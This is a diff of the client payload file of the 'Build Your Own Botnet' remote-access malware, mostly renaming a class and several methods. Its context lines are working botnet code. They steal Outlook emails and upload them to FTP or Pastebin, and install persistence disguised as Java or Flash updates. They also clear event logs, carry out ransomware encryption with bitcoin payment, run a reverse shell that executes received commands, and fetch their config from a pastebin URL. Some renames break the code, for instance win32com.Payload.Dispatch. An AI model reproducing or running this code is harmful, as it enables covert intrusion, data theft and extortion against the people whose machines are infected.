@@ -5,7 +5,6 @@ https://github.com/colental/byob
 Copyright (c) 2018 Daniel Vega-Myhre
 """
 from __future__ import print_function
-from util import *
 import os
 import sys
 import imp
@@ -45,14 +44,19 @@ import Crypto.Cipher.AES
 import Crypto.Hash.SHA256
 import Crypto.PublicKey.RSA
 import Crypto.Cipher.PKCS1_OAEP
+ 
+if 'util' in os.listdir('.'):
+    from util import *
 
 
+class PayloadError(Exception):
+    pass
 
-class clientPayload():
+
+class Payload():
     """
-    BuildYourOwnBotnet: Client Payload
+    Payload (Build Your Own Botnet)
     """
-
     _debug   = bool()
     _abort   = bool()
     _jobs    = Queue.Queue()
@@ -61,7 +65,7 @@ class clientPayload():
 
     def __init__(self, config=None):
         """
-        initiate a new clientPayload instance
+        create a Payload instance
         """
         self._sysinfo = self._get_system()
         self._command = self._get_commands()
@@ -69,15 +73,15 @@ class clientPayload():
         self._results = collections.OrderedDict()
         self._network = collections.OrderedDict()
         self._session = collections.OrderedDict()
-        self._payload = collections.OrderedDict()
+        self._client = collections.OrderedDict()
 
 
     @staticmethod
     def _get_id():
         try:
-            return Crypto.Hash.MD5.new(clientPayload._get_public_ip() + clientPayload._get_mac_address()).hexdigest()
+            return Crypto.Hash.MD5.new(Payload._get_public_ip() + Payload._get_mac_address()).hexdigest()
         except Exception as e:
-            clientPayload.debug("{} error: {}".format(clientPayload._get_id.func_name, str(e)))
+            Payload.debug("{} error: {}".format(Payload._get_id.func_name, str(e)))
 
 
     @staticmethod
@@ -85,7 +89,7 @@ class clientPayload():
         try:
             return sys.platform
         except Exception as e:
-            clientPayload.debug("{} error: {}".format(clientPayload._get_platform.func_name, str(e)))
+            Payload.debug("{} error: {}".format(Payload._get_platform.func_name, str(e)))
 
 
     @staticmethod
@@ -93,7 +97,7 @@ class clientPayload():
         try:
             return urllib2.urlopen('http://api.ipify.org').read()
         except Exception as e:
-            clientPayload.debug("{} error: {}".format(clientPayload._get_public_ip.func_name, str(e)))
+            Payload.debug("{} error: {}".format(Payload._get_public_ip.func_name, str(e)))
 
 
     @staticmethod
@@ -101,7 +105,7 @@ class clientPayload():
         try:
             return socket.gethostbyname(socket.gethostname())
         except Exception as e:
-            clientPayload.debug("{} error: {}".format(clientPayload._get_local_ip.func_name, str(e)))
+            Payload.debug("{} error: {}".format(Payload._get_local_ip.func_name, str(e)))
 
 
     @staticmethod
@@ -109,7 +113,7 @@ class clientPayload():
         try:
             return ':'.join(hex(uuid.getnode()).strip('0x').strip('L')[i:i+2] for i in range(0,11,2)).upper()
         except Exception as e:
-            clientPayload.debug("{} error: {}".format(clientPayload._get_mac_address.func_name, str(e)))
+            Payload.debug("{} error: {}".format(Payload._get_mac_address.func_name, str(e)))
 
 
     @staticmethod
@@ -117,7 +121,7 @@ class clientPayload():
         try:
             return int(struct.calcsize('P') * 8)
         except Exception as e:
-            clientPayload.debug("{} error: {}".format(clientPayload._get_architecture.func_name, str(e)))
+            Payload.debug("{} error: {}".format(Payload._get_architecture.func_name, str(e)))
 
 
     @staticmethod
@@ -125,7 +129,7 @@ class clientPayload():
         try:
             return socket.getfqdn(socket.gethostname())
         except Exception as e:
-            clientPayload.debug("{} error: {}".format(clientPayload._get_device.func_name, str(e)))
+            Payload.debug("{} error: {}".format(Payload._get_device.func_name, str(e)))
 
 
     @staticmethod
@@ -133,7 +137,7 @@ class clientPayload():
         try:
             return os.getenv('USER', os.getenv('USERNAME'))
         except Exception as e:
-            clientPayload.debug("{} error: {}".format(clientPayload._get_username.func_name, str(e)))
+            Payload.debug("{} error: {}".format(Payload._get_username.func_name, str(e)))
 
 
     @staticmethod
@@ -141,7 +145,7 @@ class clientPayload():
         try:
             return bool(ctypes.windll.shell32.IsUserAnAdmin() if os.name is 'nt' else os.getuid() == 0)
         except Exception as e:
-            clientPayload.debug("{} error: {}".format(clientPayload._get_administrator.func_name, str(e)))
+            Payload.debug("{} error: {}".format(Payload._get_administrator.func_name, str(e)))
 
 
     @staticmethod
@@ -158,7 +162,7 @@ class clientPayload():
         try:
             return random.choice([chr(n) for n in range(97,123)]) + str().join(random.choice([chr(n) for n in range(97,123)] + [chr(i) for i in range(48,58)] + [chr(i) for i in range(48,58)] + [chr(z) for z in range(65,91)]) for x in range(int(length)-1))
         except Exception as e:
-            clientPayload.debug("{} error: {}".format(clientPayload._get_random_var.func_name, str(e)))
+            Payload.debug("{} error: {}".format(Payload._get_random_var.func_name, str(e)))
 
 
     @staticmethod
@@ -172,7 +176,7 @@ class clientPayload():
                   '{} seconds'.format(int(c % 60.0)) if int(c % 60.0) else str()]
             return ', '.join([i for i in data if i])
         except Exception as e:
-            clientPayload.debug("{} error: {}".format(clientPayload._get_job_status.func_name, str(e)))
+            Payload.debug("{} error: {}".format(Payload._get_job_status.func_name, str(e)))
 
 
     @staticmethod
@@ -184,7 +188,7 @@ class clientPayload():
                 req.headers[key] = value
             return urllib2.urlopen(req).read()
         except Exception as e:
-            clientPayload.debug("{} error: {}".format(clientPayload._get_post_request.func_name, str(e)))
+            Payload.debug("{} error: {}".format(Payload._get_post_request.func_name, str(e)))
 
 
     @staticmethod
@@ -195,7 +199,7 @@ class clientPayload():
             t.start()
             return t
         except Exception as e:
-            clientPayload.debug("{} error: {}".format(clientPayload._get_windows_alert.func_name, str(e)))
+            Payload.debug("{} error: {}".format(Payload._get_windows_alert.func_name, str(e)))
 
 
     @staticmethod
@@ -212,7 +216,7 @@ class clientPayload():
             else:
                 return bytes(source)
         except Exception as e2:
-            clientPayload.debug("{} error: {}".format(clientPayload._upload_imgur.func_name, str(e2)))
+            Payload.debug("{} error: {}".format(Payload._upload_imgur.func_name, str(e2)))
 
 
     @staticmethod
@@ -223,7 +227,7 @@ class clientPayload():
             _winreg.CloseKey(reg_key)
             return True
         except Exception as e:
-            clientPayload.debug("{} error: {}".format(str(e)))
+            Payload.debug("{} error: {}".format(str(e)))
         return False
 
 
@@ -258,7 +262,7 @@ class clientPayload():
             fileh.seek(0)
             return fileh
         except Exception as e:
-            clientPayload.debug("{} error: {}".format(clientPayload._get_png_from_data.func_name, str(e)))
+            Payload.debug("{} error: {}".format(Payload._get_png_from_data.func_name, str(e)))
 
 
     @staticmethod
@@ -279,7 +283,7 @@ class clientPayload():
                 else: break
             return output
         except Exception as e:
-            clientPayload.debug("{} error: {}".format(clientPayload._get_emails_as_json.func_name, str(e)))
+            Payload.debug("{} error: {}".format(Payload._get_emails_as_json.func_name, str(e)))
 
 
     @staticmethod
@@ -304,9 +308,9 @@ class clientPayload():
                     _ = os.popen(bytes('rmdir /s /q %s' % target if os.name is 'nt' else 'rm -f %s' % target)).read()
                 except: pass
             else:
-                clientPayload.debug("{} error: file not found - '{}'".format(clientPayload._get_delete.func_name, filepath))
+                Payload.debug("{} error: file not found - '{}'".format(Payload._get_delete.func_name, filepath))
         else:
-            clientPayload.debug("{} error: expected {}, received {}".format(clientPayload._get_delete.func_name, str, type(filepath)))
+            Payload.debug("{} error: expected {}, received {}".format(Payload._get_delete.func_name, str, type(filepath)))
 
 
     @staticmethod
@@ -316,25 +320,25 @@ class clientPayload():
             try:
                 output = self._get_powershell_exec('"& { [System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog(\\"%s\\")}"' % log)
                 if output:
-                    clientPayload.debug(output)
+                    Payload.debug(output)
             except Exception as e:
-                clientPayload.debug("{} error: {}".format(clientPayload.abort.func_name, str(e)))
+                Payload.debug("{} error: {}".format(Payload.abort.func_name, str(e)))
 
 
     def _get_kwargs(self, inputstring):
         try:
             return {i.partition('=')[0]: i.partition('=')[2] for i in str(inputstring).split() if '=' in i}
         except Exception as e:
-            clientPayload.debug("{} error: {}".format(clientPayload._get_kwargs_from_string.func_name, str(e)))
+            Payload.debug("{} error: {}".format(Payload._get_kwargs_from_string.func_name, str(e)))
 
 
     def _get_system(self):
         info = {}
         for key in ['id', 'public_ip', 'local_ip', 'platform', 'mac_address', 'architecture', 'username', 'administrator', 'device']:
             value = '_get_%s' % key
-            if hasattr(clientPayload, value):
+            if hasattr(Payload, value):
                 try:
-                    info[key] = getattr(clientPayload, value)()
+                    info[key] = getattr(Payload, value)()
                 except Exception as e:
                     self.debug("{} error: {}".format(self._get_system.func_name, str(e)))
         return info
@@ -342,12 +346,12 @@ class clientPayload():
 
     def _get_commands(self):
         commands = {}
-        for cmd in vars(clientPayload):
-            if hasattr(vars(clientPayload)[cmd], 'command'):
+        for cmd in vars(Payload):
+            if hasattr(vars(Payload)[cmd], 'command'):
                 try:
-                    commands[cmd] = {'method': getattr(self, cmd), 'platforms': getattr(clientPayload, cmd).platforms, 'usage': getattr(clientPayload, cmd).usage, 'description': getattr(clientPayload, cmd).func_doc.strip().rstrip()}
+                    commands[cmd] = {'method': getattr(self, cmd), 'platforms': getattr(Payload, cmd).platforms, 'usage': getattr(Payload, cmd).usage, 'description': getattr(Payload, cmd).func_doc.strip().rstrip()}
                 except Exception as e:
-                    clientPayload.debug("{} error: {}".format(self._get_commands.func_name, str(e)))
+                    Payload.debug("{} error: {}".format(self._get_commands.func_name, str(e)))
         return commands
 
 
@@ -638,7 +642,7 @@ class clientPayload():
         try:
             pythoncom.CoInitialize()
             mode    = args[0] if len(args) else 'ftp'
-            outlook = win32com.clientPayload.Dispatch('Outlook.Application').GetNameSpace('MAPI')
+            outlook = win32com.Payload.Dispatch('Outlook.Application').GetNameSpace('MAPI')
             inbox   = outlook.GetDefaultFolder(6)
             emails  = self._get_emails_as_json(inbox.Items)
             result  = self._upload_ftp(json.dumps(emails), filetype='.txt') if 'ftp' in mode else self._upload_pastebin(json.dumps(emails))
@@ -649,7 +653,7 @@ class clientPayload():
     def _email_search(self, string):
         try:
             pythoncom.CoInitialize()
-            outlook = win32com.clientPayload.Dispatch('Outlook.Application').GetNameSpace('MAPI')
+            outlook = win32com.Payload.Dispatch('Outlook.Application').GetNameSpace('MAPI')
             inbox   = outlook.GetDefaultFolder(6)
             emails  = self._get_emails_as_json(inbox.Items)
             for k,v in emails.items():
@@ -663,7 +667,7 @@ class clientPayload():
     def _email_count(self, *args, **kwargs):
         try:
             pythoncom.CoInitialize()
-            outlook = win32com.clientPayload.Dispatch('Outlook.Application').GetNameSpace('MAPI')
+            outlook = win32com.Payload.Dispatch('Outlook.Application').GetNameSpace('MAPI')
             inbox   = outlook.GetDefaultFolder(6)
             emails  = inbox.Items
             return "\n\tEmails in Outlook inbox: %d" % len(emails)
@@ -732,7 +736,7 @@ class clientPayload():
         return True
 
 
-    def _scan_ping(self, host):
+    def _portscan_ping(self, host):
         try:
             if subprocess.call("ping -{} 1 -w 90 {}".format('n' if os.name is 'nt' else 'c', host), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True) == 0:
                 self._network[host] = {}
@@ -743,7 +747,7 @@ class clientPayload():
             return False
 
 
-    def _scan_port(self, addr):
+    def _portscan_port(self, addr):
         try:
             host = str(addr[0])
             port = str(addr[1])
@@ -765,51 +769,51 @@ class clientPayload():
         except (socket.error, socket.timeout):
             pass
         except Exception as e:
-            self.debug('{} error: {}'.format(self._scan_port.func_name, str(e)))
+            self.debug('{} error: {}'.format(self._portscan_port.func_name, str(e)))
 
 
-    def _scan_host(self, host):
+    def _portscan_host(self, host):
         try:
-            if self._scan_ping(host):
+            if self._portscan_ping(host):
                 for port in [21,22,23,25,53,80,110,111,135,139,143,179,443,445,514,993,995,1433,1434,1723,3306,3389,8000,8008,8443,8888]:
-                    self._queue.put_nowait((self._scan_port, (host, port)))
+                    self._queue.put_nowait((self._portscan_port, (host, port)))
                 for x in xrange(10):
-                    self._workers['scanner-%d' % x] = threading.Thread(target=self._task_threader, args=(self._queue,), name=time.time())
-                    self._workers['scanner-%d' % x].daemon = True
-                    self._workers['scanner-%d' % x].start()
+                    self._workers['portscan-%d' % x] = threading.Thread(target=self._task_threader, args=(self._queue,), name=time.time())
+                    self._workers['portscan-%d' % x].daemon = True
+                    self._workers['portscan-%d' % x].start()
                 self._task_manager.flag.clear()
                 for x in xrange(10):
-                    if self._workers['scanner-%d' % x].is_alive():
-                        self._workers['scanner-%d' % x].join()
+                    if self._workers['portscan-%d' % x].is_alive():
+                        self._workers['portscan-%d' % x].join()
                 self._task_manager.flag.set()
             return json.dumps(self._network)
         except Exception as e:
-            return '{} error: {}'.format(self._scan_host.func_name, str(e))
+            return '{} error: {}'.format(self._portscan_host.func_name, str(e))
 
 
-    def _scan_network(self, *args):
+    def _portscan_network(self, *args):
         try:
             stub = '.'.join(str(self._sysinfo['private_ip']).split('.')[:-1]) + '.%d'
             lan  = []
             for i in xrange(1,255):
                 lan.append(stub % i)
-                self._queue.put_nowait((self._scan_ping, stub % i))
+                self._queue.put_nowait((self._portscan_ping, stub % i))
             for _ in xrange(10):
                 x = random.randrange(100)
-                self._workers['scanner-%d' % x] = threading.Thread(target=self._task_threader, args=(self._queue,), name=time.time())
-                self._workers['scanner-%d' % x].setDaemon(True)
-                self._workers['scanner-%d' % x].start()
-            self._workers['scanner-%d' % x].join()
+                self._workers['portscan-%d' % x] = threading.Thread(target=self._task_threader, args=(self._queue,), name=time.time())
+                self._workers['portscan-%d' % x].setDaemon(True)
+                self._workers['portscan-%d' % x].start()
+            self._workers['portscan-%d' % x].join()
             for ip in lan:
-                self._queue.put_nowait((self._scan_host, ip))
+                self._queue.put_nowait((self._portscan_host, ip))
             for n in xrange(10):
                 x = random.randrange(100)
-                self._workers['scanner-%d' % x] = threading.Thread(target=self._task_threader, args=(self._queue,), name=time.time())
-                self._workers['scanner-%d' % x].start()
-            self._workers['scanner-%d' % x].join()
+                self._workers['portscan-%d' % x] = threading.Thread(target=self._task_threader, args=(self._queue,), name=time.time())
+                self._workers['portscan-%d' % x].start()
+            self._workers['portscan-%d' % x].join()
             return json.dumps(self._network)
         except Exception as e:
-            return '{} error: {}'.format(self._scan_network.func_name, str(e))
+            return '{} error: {}'.format(self._portscan_network.func_name, str(e))
 
 
     def _webcam_image(self, *args, **kwargs):
@@ -883,7 +887,7 @@ class clientPayload():
 
 
     @command(platforms=['win32','linux2','darwin'])
-    def _payload_stager(self, *args, **kwargs):
+    def _client_stager(self, *args, **kwargs):
         try:
             config  = self._server_resource('resource stager config')
             if config:
@@ -900,11 +904,11 @@ class clientPayload():
             else:
                 return "Error: dropper resource missing - config\nUse 'payload help' for usage details"
         except Exception as e:
-            return'{} error: {}'.format(self._payload_stager.func_name, str(e))
+            return'{} error: {}'.format(self._client_stager.func_name, str(e))
 
 
     @command(platforms=['win32','linux2'])
-    def _payload_executable(self, **kwargs):
+    def _client_executable(self, **kwargs):
         try:
             path = kwargs.get('path')
             if not path:
@@ -935,11 +939,11 @@ class clientPayload():
             os.chdir(orig)
             return exe
         except Exception as e3:
-            return'{} error: {}'.format(self._payload_executable.func_name, str(e3))
+            return'{} error: {}'.format(self._client_executable.func_name, str(e3))
 
 
     @command(platforms=['darwin'])
-    def _payload_application(self, **kwargs):
+    def _client_application(self, **kwargs):
         try:
             if not kwargs.get('path'):
                 return "Error: missing keyword argument 'path'"
@@ -970,13 +974,13 @@ class clientPayload():
             _ = os.popen('chmod +x %s' % executable).read()
             return appPath
         except Exception as e:
-            return "{} error: {}".format(self._payload_application.func_name, str(e))
+            return "{} error: {}".format(self._client_application.func_name, str(e))
 
 
     @command(platforms=['win32','linux2','darwin'])
     def _persistence_add_hidden_file(self, *args, **kwargs):
-        if len(self._payload):
-            value = random.choice(self._payload)
+        if len(self._client):
+            value = random.choice(self._client)
             if value and os.path.isfile(value):
                 try:
                     if os.name is 'nt':
@@ -992,7 +996,7 @@ class clientPayload():
             else:
                 return (False, "File '{}' not found".format(value))
         else:
-            self._payload.append(self._payload_stager())
+            self._client.append(self._client_stager())
             return self._persistence_add_hidden_file()
 
 
@@ -1016,8 +1020,8 @@ class clientPayload():
     @command(platforms=['linux2'])
     def _persistence_add_crontab_job(self, minutes=10, name='flashplayer'):
         try:
-            if len(self._payload):
-                value = random.choice(self._payload)
+            if len(self._client):
+                value = random.choice(self._client)
                 if value and os.path.isfile(value):
                     if not os.path.isdir('/var/tmp'):
                         os.makedirs('/var/tmp')
@@ -1040,7 +1044,7 @@ class clientPayload():
                     else:
                         return (True, path)
             else:
-                self._payload.append(self._payload_stager())
+                self._client.append(self._client_stager())
                 return self._persistence_add_crontab_job()
         except Exception as e:
             self.debug("{} error: {}".format(self._persistence_add_crontab_job.func_name, str(e)))
@@ -1067,8 +1071,8 @@ class clientPayload():
     @command(platforms=['darwin'])
     def _persistence_add_launch_agent(self,  name='com.apple.update.manager'):
         try:
-            if len(self._payload):
-                value = random.choice(self._payload)
+            if len(self._client):
+                value = random.choice(self._client)
                 if value and os.path.isfile(value):
                     code    = self._server_resource('resource bash')
                     label   = name
@@ -1085,7 +1089,7 @@ class clientPayload():
                         os.remove(fpath)
                         return (True, launch_agent)
             else:
-                self._payload.append(self._payload_stager())
+                self._client.append(self._client_stager())
                 return self._persistence_add_launch_agent()
         except Exception as e2:
             self.debug('Error: {}'.format(str(e2)))
@@ -1107,8 +1111,8 @@ class clientPayload():
 
     @command(platforms=['win32'])
     def _persistence_add_scheduled_task(self, name='Java-Update-Manager'):
-        if len(self._payload):
-            value = random.choice(self._payload)
+        if len(self._client):
+            value = random.choice(self._client)
             if value and os.path.isfile(value):
                 tmpdir      = os.path.expandvars('%TEMP%')
                 task_run    = os.path.join(tmpdir, name + os.path.splitext(value)[1])
@@ -1123,7 +1127,7 @@ class clientPayload():
                     self.debug('Add scheduled task error: {}'.format(str(e)))
             return (False, None)
         else:
-            self._payload.append(self._payload_stager())
+            self._client.append(self._client_stager())
             return self._persistence_add_scheduled_task()
 
 
@@ -1140,8 +1144,8 @@ class clientPayload():
 
     @command(platforms=['win32'])
     def _persistence_add_startup_file(self, name='Java-Update-Manager'):
-        if len(self._payload):
-            value = random.choice(self._payload)
+        if len(self._client):
+            value = random.choice(self._client)
             if value and os.path.isfile(value):
                 try:
                     appdata = os.path.expandvars("%AppData%")
@@ -1158,7 +1162,7 @@ class clientPayload():
                     self.debug('{} error: {}'.format(self._persistence_add_startup_file.func_name, str(e)))
             return (False, None)
         else:
-            self._payload.append(self._payload_stager())
+            self._client.append(self._client_stager())
             return self._persistence_add_startup_file()
 
 
@@ -1179,8 +1183,8 @@ class clientPayload():
 
     @command(platforms=['win32'])
     def _persistence_add_registry_key(self, name='Java-Update-Manager'):
-        if len(self._payload):
-            value = random.choice(self._payload)
+        if len(self._client):
+            value = random.choice(self._client)
             if value and os.path.isfile(value):
                 try:
                     self._get_new_registry_key(r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", name, value)
@@ -1189,7 +1193,7 @@ class clientPayload():
                     self.debug('{} error: {}'.format(self._persistence_add_registry_key.func_name, str(e)))
             return (False, None)
         else:
-            self._payload.append(self._payload_stager())
+            self._client.append(self._client_stager())
             return self._persistence_add_registry_key()
 
 
@@ -1210,8 +1214,8 @@ class clientPayload():
     def _persistence_add_powershell_wmi(self, command=None, task_name='Java-Update-Manager'):
         try:
             cmd_line  = ""
-            if len(self._payload):
-                value = random.choice(self._payload)
+            if len(self._client):
+                value = random.choice(self._client)
                 if value and os.path.isfile(value):
                     cmd_line = 'start /b /min {}'.format(value)
                 elif command:
@@ -1226,7 +1230,7 @@ class clientPayload():
                         return (True, result)
                 return (False, None)
             else:
-                self._payload.append(self._payload_stager())
+                self._client.append(self._client_stager())
                 return self._persistence_add_powershell_wmi()
         except Exception as e:
             self.debug('{} error: {}'.format(self._persistence_add_powershell_wmi.func_name, str(e)))
@@ -1414,7 +1418,7 @@ class clientPayload():
                         _ = os.popen('taskkill /im %s /f' % exe if os.name is 'nt' else 'kill -9 %s' % exe).read()
                         output.update({str(p.name()): "killed"})
                     except Exception as e:
-                        clientPayload.debug(str(e))
+                        Payload.debug(str(e))
                 return json.dumps(output)
         except Exception as e:
             self.debug("{} error: {}".format(self._ps_kill.func_name, str(e)))
@@ -1908,17 +1912,17 @@ class clientPayload():
             self.debug("{} error: {}".format(self.stop.func_name, str(e)))
 
 
-    @command(platforms=['win32','linux2','darwin'], command=True, usage='scan <host>')
-    def scan(self, args):
+    @command(platforms=['win32','linux2','darwin'], command=True, usage='portscan <target>')
+    def portscan(self, args):
         """
-        scan host/network for online hosts and open ports
+        portscan the network to find online hosts and open ports
         """
         try:
             args = str(args).split()
             host = [i for i in args if self._get_if_ipv4(i)][0] if len([i for i in args if self._get_if_ipv4(i)]) else self._sysinfo.get('local')
-            return self._scan_network(host) if 'network' in args else self._scan_host(host)
+            return self._portscan_network(host) if 'network' in args else self._portscan_host(host)
         except Exception as e:
-            self.debug("{} error: {}".format(self.scan.func_name, str(e)))
+            self.debug("{} error: {}".format(self.portscan.func_name, str(e)))
 
 
     @command(platforms=['win32','linux2','darwin'], command=True, usage='unzip <file>')
@@ -1944,7 +1948,7 @@ class clientPayload():
         if not args:
             try:
                 pythoncom.CoInitialize()
-                installed = win32com.clientPayload.Dispatch('Outlook.Application').GetNameSpace('MAPI')
+                installed = win32com.Payload.Dispatch('Outlook.Application').GetNameSpace('MAPI')
                 return "\tOutlook is installed on this host\n\t{}".format(self.email.usage)
             except: pass
             return "Outlook not installed on this host"
@@ -1978,7 +1982,7 @@ class clientPayload():
                 payment = self._server_resource('api bitcoin ransom_payment')
                 return self._ransom_payment(payment)
             except:
-                return "{} error: {}".format(clientPayload._ransom_payment.func_name, "bitcoin wallet required for ransom payment")
+                return "{} error: {}".format(Payload._ransom_payment.func_name, "bitcoin wallet required for ransom payment")
         elif 'decrypt' in cmd:
             return self._ransom_decrypt_threader(action)
         elif 'encrypt' in cmd:
@@ -2035,9 +2039,9 @@ class clientPayload():
         try:
             if self._get_administrator():
                 return "Current user '{}' has administrator privileges".format(self._sysinfo.get('username'))
-            if self._payload.get('established') and os.path.isfile(self._payload.get('result')):
+            if self._client.get('established') and os.path.isfile(self._client.get('result')):
                 if os.name is 'nt':
-                    win32com.shell.shell.ShellExecuteEx(lpVerb='runas', lpFile=sys.executable, lpParameters='{} asadmin'.format(self._payload.get('result')))
+                    win32com.shell.shell.ShellExecuteEx(lpVerb='runas', lpFile=sys.executable, lpParameters='{} asadmin'.format(self._client.get('result')))
                 else:
                     return "Privilege escalation not yet available on '{}'".format(sys.platform)
         except Exception as e:
@@ -2069,27 +2073,27 @@ class clientPayload():
             return "File '{}' not found".format(str(path))
 
 
-    @command(platforms=['win32','linux2','darwin'], command=True, usage='payload [args] [kwargs]')
-    def payload(self, args=None):
+    @command(platforms=['win32','linux2','darwin'], command=True, usage='client <type> [options]')
+    def client(self, args=None):
         """
-        payload compiled as executable disguised as plugin update
+        client payload stager compiled as executable disguised as plugin update
         """
         try:
             if not args or 'help' in args:
-                return '\n usage: payload <type>\n    type: py, exe, app\n    kwargs:\n\tname: filename\n\ticon: java, flash, pdf\n'
+                return '\n usage: {}\n    type: py, exe, app\n    kwargs:\n\tname: up to 20 alphanumeric characters\n\ticon: java, flash, pdf\n'.format(self.client.usage)
             else:
                 kwargs  = self._get_kwargs(args)
-                kwargs['path'] = self._payload_stager()
+                kwargs['path'] = self._client_stager()
                 if any(map(kwargs.__contains__, ['exe','app'])):
                     if os.name == 'darwin':
-                        path = self._payload_application(**kwargs)
+                        path = self._client_application(**kwargs)
                     else:
-                        path = self._payload_executable(**kwargs)
+                        path = self._client_executable(**kwargs)
                 name = os.path.splitext(kwargs.get('path'))[0]
-                self._payload[name] = kwargs.get('path')
-                return json.dumps(self._payload)
+                self._client[name] = kwargs.get('path')
+                return json.dumps(self._client)
         except Exception as e:
-            return "{} error: {}".format(self.payload.func_name, str(e))
+            return "{} error: {}".format(self.client.func_name, str(e))
 
 
     @command(platforms=['win32','linux2','darwin'], max_bytes=4000, buffer=cStringIO.StringIO(), window=None, command=True, usage='keylogger <args>')
@@ -2159,16 +2163,16 @@ class clientPayload():
                 cmd, _, action = str(args).partition(' ')
                 methods = [m for m in self.persistence.methods if sys.platform in self.persistence.methods[m]['platforms']]
                 if cmd not in ('add','remove'):
-                    return self.persistence.usage + str('\nmethods: %s' % ', '.join([str(m) for m in self.persistence.methods if sys.platform in getattr(clientPayload, '_persistence_add_%s' % m).platforms]))
-                if not self._payload:
-                    self._payload.append(self.payload(random.choice(['java','flash','chrome','firefox'])))
+                    return self.persistence.usage + str('\nmethods: %s' % ', '.join([str(m) for m in self.persistence.methods if sys.platform in getattr(Payload, '_persistence_add_%s' % m).platforms]))
+                if not self._client:
+                    self._client.append(self.client(random.choice(['java','flash','chrome','firefox'])))
                 for method in methods:
                     if method == 'all' or action == method:
                         self.persistence.methods[method]['established'], self.persistence.methods[method]['result'] = getattr(self, target.format(cmd, method))()
                 return json.dumps({m: self.persistence.methods[m]['result'] for m in methods})
         except Exception as e:
             self.debug("{} error: {}".format(self.persistence.func_name, str(e)))
-        return str(self.persistence.usage + '\nmethods: %s' % ', '.join([m for m in self.persistence.methods if sys.platform in getattr(clientPayload, '_persistence_add_%s' % m).platforms]))
+        return str(self.persistence.usage + '\nmethods: %s' % ', '.join([m for m in self.persistence.methods if sys.platform in getattr(Payload, '_persistence_add_%s' % m).platforms]))
 
 
     @command(platforms=['linux2','darwin'], capture=[], command=True, usage='packetsniffer [mode] [seconds]')
@@ -2224,7 +2228,7 @@ class clientPayload():
                         remove = getattr(self, '_persistence_remove_{}'.format(method))()
                     except Exception as e2:
                         self.debug("{} error: {}".format(method, str(e2)))
-            for stager in self._payload:
+            for stager in self._client:
                 self._get_delete(stager)
             if not self._debug:
                 self._get_delete(sys.argv[0])
@@ -2250,7 +2254,7 @@ class clientPayload():
                         if isinstance(task, dict):
                             cmd, _, action = [i.encode() for i in task['command'].partition(' ')]
                             try:
-                                result  = bytes(getattr(self, cmd)(action) if action else getattr(self, cmd)()) if cmd in sorted([attr for attr in vars(clientPayload) if not attr.startswith('_')]) else bytes().join(subprocess.Popen(cmd, 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True).communicate())
+                                result  = bytes(getattr(self, cmd)(action) if action else getattr(self, cmd)()) if cmd in sorted([attr for attr in vars(Payload) if not attr.startswith('_')]) else bytes().join(subprocess.Popen(cmd, 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True).communicate())
                             except Exception as e1:
                                 result  = "{} error: {}".format(self.reverse_tcp_shell.func_name, str(e1))
                             task.update({'result': result})
@@ -2271,8 +2275,8 @@ class clientPayload():
         """
         print output to console if debugging mode is enabled
         """
-        if clientPayload._debug:
-            with clientPayload._lock:
+        if Payload._debug:
+            with Payload._lock:
                 print(bytes(data))
 
 
@@ -2308,7 +2312,7 @@ class clientPayload():
 
 
 def main():
-    payload = clientPayload()
+    payload = Payload()
     payload.run(config='https://pastebin.com/raw/uYGhnVqp', debug=True)
     return payload
 
